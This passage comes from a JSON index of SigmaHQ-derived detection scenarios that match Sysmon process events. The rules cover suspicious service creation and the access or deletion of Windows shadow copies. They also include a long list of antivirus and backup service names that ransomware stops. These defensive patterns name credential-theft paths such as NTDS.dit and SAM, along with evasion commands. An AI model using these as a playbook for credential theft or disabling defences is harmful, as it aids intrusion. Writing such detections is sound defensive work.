"9762f6fe90ae7d187ed9356c519597e54bd8b120398821a41cdcc069dc7d2b94"}, "0.2": {"digest": "90c12d9c0e351414f6977d246886fcfca52d7e46daaa9b8a49d1f9036f2ee308"}}}, "sigmahq/proc_creation_win_susp_redirect_local_admin_share": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_redirect_local_admin_share\ndescription: |\n  Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '>' && (evt.Parsed.CommandLine contains '\\\\\\\\127.0.0.1\\\\admin$\\\\' || evt.Parsed.CommandLine contains '\\\\\\\\localhost\\\\admin$\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1048\n\n  label: \"Suspicious Redirection to Local Admin Share\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers\n", "path": "scenarios/sigmahq/proc_creation_win_susp_redirect_local_admin_share.yml", "version": "0.2", "versions": {"0.1": {"digest": "dd5b209c9085e09a2762a7274e8a26a787f190f3dac6f89841efac9e0320861d"}, "0.2": {"digest": "4f362dfa6efe7ae55361df10e7a6bfdc799a2eb5b069250e418ca619f43c243f"}}}, "sigmahq/proc_creation_win_susp_right_to_left_override": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_right_to_left_override\ndescription: |\n  Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence. This is used as an obfuscation and masquerading techniques. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\u202e')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.002\n\n  label: \"Potential Defense Evasion Via Right-to-Left Override\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence. This is used as an obfuscation and masquerading techniques. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_right_to_left_override.yml", "version": "0.2", "versions": {"0.1": {"digest": "f2654dd43fd004eae6895784b48675fb8e67a85388135200aca634b237e30443"}, "0.2": {"digest": "90c30094ff8e7917d9fbd56584848fb2582c223661a9f97140611590a2686a4f"}}}, "sigmahq/proc_creation_win_susp_script_exec_from_env_folder": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_script_exec_from_env_folder\ndescription: |\n  Detects a suspicious script execution in temporary folders or folders accessible by environment variables\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.CommandLine contains ' -ep bypass ' || evt.Parsed.CommandLine contains ' -ExecutionPolicy bypass ' || evt.Parsed.CommandLine contains ' -w hidden ' || evt.Parsed.CommandLine contains '/e:javascript ' || evt.Parsed.CommandLine contains '/e:Jscript ' || evt.Parsed.CommandLine contains '/e:vbscript ' || evt.Parsed.OriginalFileName in ['cscript.exe', 'mshta.exe', 'wscript.exe']) && (evt.Parsed.CommandLine contains ':\\\\Perflogs\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\Temp' || evt.Parsed.CommandLine contains '\\\\Temporary Internet' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp' || evt.Parsed.CommandLine contains ':\\\\Users\\\\' && evt.Parsed.CommandLine contains '\\\\Favorites\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\' && evt.Parsed.CommandLine contains '\\\\Favourites\\\\' || evt.Parsed.CommandLine contains ':\\\\Users\\\\' && evt.Parsed.CommandLine contains '\\\\Contacts\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Script Interpreter Execution From Suspicious Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious script execution in temporary folders or folders accessible by environment variables\n", "path": "scenarios/sigmahq/proc_creation_win_susp_script_exec_from_env_folder.yml", "version": "0.2", "versions": {"0.1": {"digest": "0329ad0e42b4a4a66661423f66a2f08518fdde6cdf39e33e412bff88827342a1"}, "0.2": {"digest": "bf4a7c35e6c95da6a46541f61d06fc709394c15c45565593a2fe06515fccad87"}}}, "sigmahq/proc_creation_win_susp_script_exec_from_temp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_script_exec_from_temp\ndescription: |\n  Detects a suspicious script executions from temporary folder\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe') && (evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp' || evt.Parsed.CommandLine contains '\\\\Temporary Internet' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\Temp' || evt.Parsed.CommandLine contains '%TEMP%' || evt.Parsed.CommandLine contains '%TMP%' || evt.Parsed.CommandLine contains '%LocalAppData%\\\\Temp') && not (evt.Parsed.CommandLine contains ' >' || evt.Parsed.CommandLine contains 'Out-File' || evt.Parsed.CommandLine contains 'ConvertTo-Json' || evt.Parsed.CommandLine contains '-WindowStyle hidden -Verb runAs' || evt.Parsed.CommandLine contains '\\\\Windows\\\\system32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Temp\\\\Amazon\\\\EC2-Windows\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Suspicious Script Execution From Temp Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious script executions from temporary folder\n", "path": "scenarios/sigmahq/proc_creation_win_susp_script_exec_from_temp.yml", "version": "0.2", "versions": {"0.1": {"digest": "d8dafa4a644e55f0791588d8efdfcebe26794339980e65e811119774c31e52f0"}, "0.2": {"digest": "a65c80e465f38d00961b7374c3bee9aeaa8c8217b81824e7806dc9e8c80e6492"}}}, "sigmahq/proc_creation_win_susp_sensitive_file_access_shadowcopy": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_sensitive_file_access_shadowcopy\ndescription: |\n  Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit) \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy' && (evt.Parsed.CommandLine contains '\\\\NTDS.dit' || evt.Parsed.CommandLine contains '\\\\SYSTEM' || evt.Parsed.CommandLine contains '\\\\SECURITY'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1490\n\n  label: \"Sensitive File Access Via Volume Shadow Copy Backup\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit) \n", "path": "scenarios/sigmahq/proc_creation_win_susp_sensitive_file_access_shadowcopy.yml", "version": "0.2", "versions": {"0.1": {"digest": "5348a90544b05285bb117d31d5c64ff64b88354b491259c60bd455359f89bd82"}, "0.2": {"digest": "9f817650b262cea02d9beaae859c720c11fcb9c485f06fee7142471d6b741650"}}}, "sigmahq/proc_creation_win_susp_service_creation": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_service_creation\ndescription: |\n  Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\sc.exe' && evt.Parsed.CommandLine contains 'create' && evt.Parsed.CommandLine contains 'binPath=' || evt.Parsed.CommandLine contains 'New-Service' && evt.Parsed.CommandLine contains '-BinaryPathName') && (evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains 'wscript' || evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'svchost' || evt.Parsed.CommandLine contains 'dllhost' || evt.Parsed.CommandLine contains 'cmd ' || evt.Parsed.CommandLine contains 'cmd.exe /c' || evt.Parsed.CommandLine contains 'cmd.exe /k' || evt.Parsed.CommandLine contains 'cmd.exe /r' || evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\TEMP\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1543.003\n\n  label: \"Suspicious New Service Creation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths\n", "path": "scenarios/sigmahq/proc_creation_win_susp_service_creation.yml", "version": "0.2", "versions": {"0.1": {"digest": "8345953cf1ac85058721c40d0832396ed74b56c32aac18c3ced5776817576c5f"}, "0.2": {"digest": "67397f42bcd40c3b3c96d30b9881d448958553b4c8ddf950ae3c9fb2e3d6bbfc"}}}, "sigmahq/proc_creation_win_susp_service_dir": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_service_dir\ndescription: |\n  Detects a service binary running in a suspicious directory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image contains '\\\\Users\\\\Public\\\\' || evt.Parsed.Image contains '\\\\$Recycle.bin' || evt.Parsed.Image contains '\\\\Users\\\\All Users\\\\' || evt.Parsed.Image contains '\\\\Users\\\\Default\\\\' || evt.Parsed.Image contains '\\\\Users\\\\Contacts\\\\' || evt.Parsed.Image contains '\\\\Users\\\\Searches\\\\' || evt.Parsed.Image contains 'C:\\\\Perflogs\\\\' || evt.Parsed.Image contains '\\\\config\\\\systemprofile\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\Fonts\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\IME\\\\' || evt.Parsed.Image contains '\\\\Windows\\\\addins\\\\') && (evt.Parsed.ParentImage endsWith '\\\\services.exe' || evt.Parsed.ParentImage endsWith '\\\\svchost.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1202\n\n  label: \"Suspicious Service Binary Directory\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a service binary running in a suspicious directory\n", "path": "scenarios/sigmahq/proc_creation_win_susp_service_dir.yml", "version": "0.2", "versions": {"0.1": {"digest": "bfcab7dd2d493294f9d058a4266cf5d9ecdddf2bee4a900cbd850ef24a5c91ab"}, "0.2": {"digest": "597a1d930820719e0feb570ae49d5a5e9900b964b8fbf5ffd91e4bd8dc0f6fdb"}}}, "sigmahq/proc_creation_win_susp_service_tamper": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_service_tamper\ndescription: |\n  Detects the usage of binaries such as 'net', 'sc' or 'powershell' in order to stop, pause, disable or delete critical or important Windows services such as AV, Backup, etc. As seen being used in some ransomware scripts \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName in ['net.exe', 'net1.exe', 'PowerShell.EXE', 'psservice.exe', 'pwsh.dll', 'sc.exe'] || evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\PsService.exe' || evt.Parsed.Image endsWith '\\\\PsService64.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\sc.exe') && (evt.Parsed.CommandLine contains ' delete ' || evt.Parsed.CommandLine contains ' pause ' || evt.Parsed.CommandLine contains ' stop ' || evt.Parsed.CommandLine contains 'Stop-Service ' || evt.Parsed.CommandLine contains 'Remove-Service ' || evt.Parsed.CommandLine contains 'config' && evt.Parsed.CommandLine contains 'start=disabled') && (evt.Parsed.CommandLine contains '143Svc' || evt.Parsed.CommandLine contains 'Acronis VSS Provider' || evt.Parsed.CommandLine contains 'AcronisAgent' || evt.Parsed.CommandLine contains 'AcrSch2Svc' || evt.Parsed.CommandLine contains 'AdobeARMservice' || evt.Parsed.CommandLine contains 'AHS Service' || evt.Parsed.CommandLine contains 'Antivirus' || evt.Parsed.CommandLine contains 'Apache4' || evt.Parsed.CommandLine contains 'ARSM' || evt.Parsed.CommandLine contains 'aswBcc' || evt.Parsed.CommandLine contains 'AteraAgent' || evt.Parsed.CommandLine contains 'Avast Business Console Client Antivirus Service' || evt.Parsed.CommandLine contains 'avast! Antivirus' || evt.Parsed.CommandLine contains 'AVG Antivirus' || evt.Parsed.CommandLine contains 'avgAdminClient' || evt.Parsed.CommandLine contains 'AvgAdminServer' || evt.Parsed.CommandLine contains 'AVP1' || evt.Parsed.CommandLine contains 'BackupExec' || evt.Parsed.CommandLine contains 'bedbg' || evt.Parsed.CommandLine contains 'BITS' || evt.Parsed.CommandLine contains 'BrokerInfrastructure' || evt.Parsed.CommandLine contains 'CASLicenceServer' || evt.Parsed.CommandLine contains 'CASWebServer' || evt.Parsed.CommandLine contains 'Client Agent 7.60' || evt.Parsed.CommandLine contains 'Core Browsing Protection' || evt.Parsed.CommandLine contains 'Core Mail Protection' || evt.Parsed.CommandLine contains 'Core Scanning Server' || evt.Parsed.CommandLine contains 'DCAgent' || evt.Parsed.CommandLine contains 'dwmrcs' || evt.Parsed.CommandLine contains 'EhttpSr' || evt.Parsed.CommandLine contains 'ekrn' || evt.Parsed.CommandLine contains 'Enterprise Client Service' || evt.Parsed.CommandLine contains 'epag' || evt.Parsed.CommandLine contains 'EPIntegrationService' || evt.Parsed.CommandLine contains 'EPProtectedService' || evt.Parsed.CommandLine contains 'EPRedline' || evt.Parsed.CommandLine contains 'EPSecurityService' || evt.Parsed.CommandLine contains 'EPUpdateService' || evt.Parsed.CommandLine contains 'EraserSvc11710' || evt.Parsed.CommandLine contains 'EsgShKernel' || evt.Parsed.CommandLine contains 'ESHASRV' || evt.Parsed.CommandLine contains 'FA_Scheduler' || evt.Parsed.CommandLine contains 'FirebirdGuardianDefaultInstance' || evt.Parsed.CommandLine contains 'FirebirdServerDefaultInstance' || evt.Parsed.CommandLine contains 'FontCache3.0.0.0' || evt.Parsed.CommandLine contains 'HealthTLService' || evt.Parsed.CommandLine contains 'hmpalertsvc' || evt.Parsed.CommandLine contains 'HMS' || evt.Parsed.CommandLine contains 'HostControllerService' || evt.Parsed.CommandLine contains 'hvdsvc' || evt.Parsed.CommandLine contains 'IAStorDataMgrSvc' || evt.Parsed.CommandLine contains 'IBMHPS' || evt.Parsed.CommandLine contains 'ibmspsvc' || evt.Parsed.CommandLine contains 'IISAdmin' || evt.Parsed.CommandLine contains 'IMANSVC' || evt.Parsed.CommandLine contains 'IMAP4Svc' || evt.Parsed.CommandLine contains 'instance2' || evt.Parsed.CommandLine contains 'KAVFS' || evt.Parsed.CommandLine contains 'KAVFSGT' || evt.Parsed.CommandLine contains 'kavfsslp' || evt.Parsed.CommandLine contains 'KeyIso' || evt.Parsed.CommandLine contains 'klbackupdisk' || evt.Parsed.CommandLine contains 'klbackupflt' || evt.Parsed.CommandLine contains 'klflt' || evt.Parsed.CommandLine contains 'klhk' || evt.Parsed.CommandLine contains 'KLIF' || evt.Parsed.CommandLine contains 'klim6' || evt.Parsed.CommandLine contains 'klkbdflt' || evt.Parsed.CommandLine contains 'klmouflt' || evt.Parsed.CommandLine contains 'klnagent' || evt.Parsed.CommandLine contains 'klpd' || evt.Parsed.CommandLine contains 'kltap' || evt.Parsed.CommandLine contains 'KSDE1.0.0' || evt.Parsed.CommandLine contains 'LogProcessorService' || evt.Parsed.CommandLine contains 'M8EndpointAgent' || evt.Parsed.CommandLine contains 'macmnsvc' || evt.Parsed.CommandLine contains 'masvc' || evt.Parsed.CommandLine contains 'MBAMService' || evt.Parsed.CommandLine contains 'MBCloudEA' || evt.Parsed.CommandLine contains 'MBEndpointAgent' || evt.Parsed.CommandLine contains 'McAfeeDLPAgentService' || evt.Parsed.CommandLine contains 'McAfeeEngineService' || evt.Parsed.CommandLine contains 'MCAFEEEVENTPARSERSRV' || evt.Parsed.CommandLine contains 'McAfeeFramework' || evt.Parsed.CommandLine contains 'MCAFEETOMCATSRV530' || evt.Parsed.CommandLine contains 'McShield' || evt.Parsed.CommandLine contains 'McTaskManager' || evt.Parsed.CommandLine contains 'mfefire' || evt.Parsed.CommandLine contains 'mfemms' || evt.Parsed.CommandLine contains 'mfevto' || evt.Parsed.CommandLine contains 'mfevtp' || evt.Parsed.CommandLine contains 'mfewc' || evt.Parsed.CommandLine contains 'MMS' || evt.Parsed.CommandLine contains 'mozyprobackup' || evt.Parsed.CommandLine contains 'MSComplianceAudit' || evt.Parsed.CommandLine contains 'MSDTC' || evt.Parsed.CommandLine contains 'MsDtsServer' || evt.Parsed.CommandLine contains 'MSExchange' || evt.Parsed.CommandLine contains 'msftesq1SPROO' || evt.Parsed.CommandLine contains 'msftesql$PROD' || evt.Parsed.CommandLine contains 'msftesql$SQLEXPRESS' || evt.Parsed.CommandLine contains 'MSOLAP$SQL_2008' || evt.Parsed.CommandLine contains 'MSOLAP$SYSTEM_BGC' || evt.Parsed.CommandLine contains 'MSOLAP$TPS' || evt.Parsed.CommandLine contains 'MSOLAP$TPSAMA' || evt.Parsed.CommandLine contains 'MSOLAPSTPS' || evt.Parsed.CommandLine contains 'MSOLAPSTPSAMA' || evt.Parsed.CommandLine contains 'mssecflt' || evt.Parsed.CommandLine contains 'MSSQ!I.SPROFXENGAGEMEHT' || evt.Parsed.CommandLine contains 'MSSQ0SHAREPOINT' || evt.Parsed.CommandLine contains 'MSSQ0SOPHOS' || evt.Parsed.CommandLine contains 'MSSQL' || evt.Parsed.CommandLine contains 'MSSQLFDLauncher$' || evt.Parsed.CommandLine contains 'MySQL' || evt.Parsed.CommandLine contains 'NanoServiceMain' || evt.Parsed.CommandLine contains 'NetMsmqActivator' || evt.Parsed.CommandLine contains 'NetPipeActivator' || evt.Parsed.CommandLine contains 'netprofm' || evt.Parsed.CommandLine contains 'NetTcpActivator' || evt.Parsed.CommandLine contains 'NetTcpPortSharing' || evt.Parsed.CommandLine contains 'ntrtscan' || evt.Parsed.CommandLine contains 'nvspwmi' || evt.Parsed.CommandLine contains 'ofcservice' || evt.Parsed.CommandLine contains 'Online Protection System' || evt.Parsed.CommandLine contains 'OracleClientCache80' || evt.Parsed.CommandLine contains 'OracleDBConsole' || evt.Parsed.CommandLine contains 'OracleMTSRecoveryService' || evt.Parsed.CommandLine contains 'OracleOraDb11g_home1' || evt.Parsed.CommandLine contains 'OracleService' || evt.Parsed.CommandLine contains 'OracleVssWriter' || evt.Parsed.CommandLine contains 'osppsvc' || evt.Parsed.CommandLine contains 'PandaAetherAgent' || evt.Parsed.CommandLine contains 'PccNTUpd' || evt.Parsed.CommandLine contains 'PDVFSService' || evt.Parsed.CommandLine contains 'POP3Svc' || evt.Parsed.CommandLine contains 'postgresql-x64-9.4' || evt.Parsed.CommandLine contains 'POVFSService' || evt.Parsed.CommandLine contains 'PSUAService' || evt.Parsed.CommandLine contains 'Quick Update Service' || evt.Parsed.CommandLine contains 'RepairService' || evt.Parsed.CommandLine contains 'ReportServer' || evt.Parsed.CommandLine contains 'ReportServer$' || evt.Parsed.CommandLine contains 'RESvc' || evt.Parsed.CommandLine contains 'RpcEptMapper' || evt.Parsed.CommandLine contains 'sacsvr' || evt.Parsed.CommandLine contains 'SamSs' || evt.Parsed.CommandLine contains 'SAVAdminService' || evt.Parsed.CommandLine contains 'SAVService' || evt.Parsed.CommandLine contains 'ScSecSvc' || evt.Parsed.CommandLine contains 'SDRSVC' || evt.Parsed.CommandLine contains 'SearchExchangeTracing' || evt.Parsed.CommandLine contains 'sense' || evt.Parsed.CommandLine contains 'SentinelAgent' || evt.Parsed.CommandLine contains 'SentinelHelperService' || evt.Parsed.CommandLine contains 'SepMasterService' || evt.Parsed.CommandLine contains 'ShMonitor' || evt.Parsed.CommandLine contains 'Smcinst' || evt.Parsed.CommandLine contains 'SmcService' || evt.Parsed.CommandLine contains 'SMTPSvc' || evt.Parsed.CommandLine contains 'SNAC' || evt.Parsed.CommandLine contains 'SntpService' || evt.Parsed.CommandLine contains 'Sophos' || evt.Parsed.CommandLine contains 'SQ1SafeOLRService' || evt.Parsed.CommandLine contains 'SQL Backups' || evt.Parsed.CommandLine contains 'SQL Server' || evt.Parsed.CommandLine contains 'SQLAgent' || evt.Parsed.CommandLine contains 'SQLANYs_Sage_FAS_Fixed_Assets' || evt.Parsed.CommandLine contains 'SQLBrowser' || evt.Parsed.CommandLine contains 'SQLsafe' || evt.Parsed.CommandLine contains 'SQLSERVERAGENT' || evt.Parsed.CommandLine contains 'SQLTELEMETRY' || evt.Parsed.CommandLine contains 'SQLWriter' || evt.Parsed.CommandLine contains 'SSISTELEMETRY130' || evt.Parsed.CommandLine contains 'SstpSvc' || evt.Parsed.CommandLine contains 'storflt' || evt.Parsed.CommandLine contains 'svcGenericHost' || evt.Parsed.CommandLine contains 'swc_service' || evt.Parsed.CommandLine contains 'swi_filter' || evt.Parsed.CommandLine contains 'swi_service' || evt.Parsed.CommandLine contains 'swi_update' || evt.Parsed.CommandLine contains 'Symantec' || evt.Parsed.CommandLine contains 'TeamViewer' || evt.Parsed.CommandLine contains 'Telemetryserver' || evt.Parsed.CommandLine contains 'ThreatLockerService' || evt.Parsed.CommandLine contains 'TMBMServer' || evt.Parsed.CommandLine contains 'TmCCSF' || evt.Parsed.CommandLine contains 'TmFilter' || evt.Parsed.CommandLine contains 'TMiCRCScanService' || evt.Parsed.CommandLine contains 'tmlisten' || evt.Parsed.CommandLine contains 'TMLWCSService' || evt.Parsed.CommandLine contains 'TmPfw' || evt.Parsed.CommandLine contains 'TmPreFilter' || evt.Parsed.CommandLine contains 'TmProxy' || evt.Parsed.CommandLine contains 'TMSmartRelayService' || evt.Parsed.CommandLine contains 'tmusa' || evt.Parsed.CommandLine contains 'Tomcat' || evt.Parsed.CommandLine contains 'Trend Micro Deep Security Manager' || evt.Parsed.CommandLine contains 'TrueKey' || evt.Parsed.CommandLine contains 'UFNet' || evt.Parsed.CommandLine contains 'UI0Detect' || evt.Parsed.CommandLine contains 'UniFi' || evt.Parsed.CommandLine contains 'UTODetect' || evt.Parsed.CommandLine contains 'vds' || evt.Parsed.CommandLine contains 'Veeam' || evt.Parsed.CommandLine contains 'VeeamDeploySvc' || evt.Parsed.CommandLine contains 'Veritas System Recovery' || evt.Parsed.CommandLine contains 'vmic' || evt.Parsed.CommandLine contains 'VMTools' || evt.Parsed.CommandLine contains 'vmvss' || evt.Parsed.CommandLine contains 'VSApiNt' || evt.Parsed.CommandLine contains 'VSS' || evt.Parsed.CommandLine contains 'W3Svc' || evt.Parsed.CommandLine contains 'wbengine' || evt.Parsed.CommandLine contains 'WdNisSvc' || evt.Parsed.CommandLine contains 'WeanClOudSve' || evt.Parsed.CommandLine contains 'Weems JY' || evt.Parsed.CommandLine contains 'WinDefend' || evt.Parsed.CommandLine contains 'wmms' || evt.Parsed.CommandLine contains 'wozyprobackup' || evt.Parsed.CommandLine contains 'WPFFontCache_v0400' || evt.Parsed.CommandLine contains 'WRSVC' || evt.Parsed.CommandLine contains 'wsbexchange' || evt.Parsed.CommandLine contains 'WSearch' || evt.Parsed.CommandLine contains 'Zoolz 2 Service'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1489\n\n  label: \"Suspicious Windows Service Tampering\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of binaries such as 'net', 'sc' or 'powershell' in order to stop, pause, disable or delete critical or important Windows services such as AV, Backup, etc. As seen being used in some ransomware scripts \n", "path": "scenarios/sigmahq/proc_creation_win_susp_service_tamper.yml", "version": "0.2", "versions": {"0.1": {"digest": "5c755dee3163f40480097207a3af202f41aae784550c8c699928388ba4a16213"}, "0.2": {"digest": "f82f0e422a29df0afeedb2ffb9aae22ca2891e93c60d40b474f13fceb4d99181"}}}, "sigmahq/proc_creation_win_susp_shadow_copies_deletion": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_shadow_copies_deletion\ndescription: |\n  Shadow Copies deletion using operating systems utilities\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\vssadmin.exe' || evt.Parsed.Image endsWith '\\\\diskshadow.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll', 'wmic.exe', 'VSSADMIN.EXE', 'diskshadow.exe']) && evt.Parsed.CommandLine contains 'shadow' && evt.Parsed.CommandLine contains 'delete' || (evt.Parsed.Image endsWith '\\\\wbadmin.exe' || evt.Parsed.OriginalFileName == 'WBADMIN.EXE') && evt.Parsed.CommandLine contains 'delete' && evt.Parsed.CommandLine contains 'catalog' && evt.Parsed.CommandLine contains 'quiet' || (evt.Parsed.Image endsWith '\\\\vssadmin.exe' || evt.Parsed.OriginalFileName == 'VSSADMIN.EXE') && evt.Parsed.CommandLine contains 'resize' && evt.Parsed.CommandLine contains 'shadowstorage' && (evt.Parsed.CommandLine contains 'unbounded' || evt.Parsed.CommandLine contains '/MaxSize='))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1070\n   - attack.t1490\n\n  label: \"Shadow Copies Deletion Using Operating Systems Utilities\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Shadow Copies deletion using operating systems utilities\n", "path": "scenarios/sigmahq/proc_creation_win_susp_shadow_copies_deletion.yml", "version": "0.2", "versions": {"0.1": {"digest": "c19591cc3d88e74052f65e07e6c48f3a60a1c6c9fd041262d4503ec15307ef0b"}, "0.2": {"digest": "e64083e6db48cf5168411b23ff9fb01ccfc6b4cfda9197aec61e98f723498867"}}}, "sigmahq/proc_creation_win_susp_shell_spawn_susp_program": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_shell_spawn_susp_program\ndescription: |\n  Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\mshta.exe' || evt.Parsed.ParentImage endsWith '\\\\powershell.exe' || evt.Parsed.ParentImage endsWith '\\\\pwsh.exe' || evt.Parsed.ParentImage endsWith '\\\\rundll32.exe' || evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe' || evt.Parsed.ParentImage endsWith '\\\\wmiprvse.exe' || evt.Parsed.ParentImage endsWith '\\\\regsvr32.exe') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\nslookup.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe') && not (evt.Parsed.CurrentDirectory contains '\\\\ccmcache\\\\' || evt.Parsed.ParentCommandLine contains '\\\\Program Files\\\\Amazon\\\\WorkSpacesConfig\\\\Scripts\\\\setup-scheduledtask.ps1' || evt.Parsed.ParentCommandLine contains '\\\\Program Files\\\\Amazon\\\\WorkSpacesConfig\\\\Scripts\\\\set-selfhealing.ps1' || evt.Parsed.ParentCommandLine contains '\\\\Program 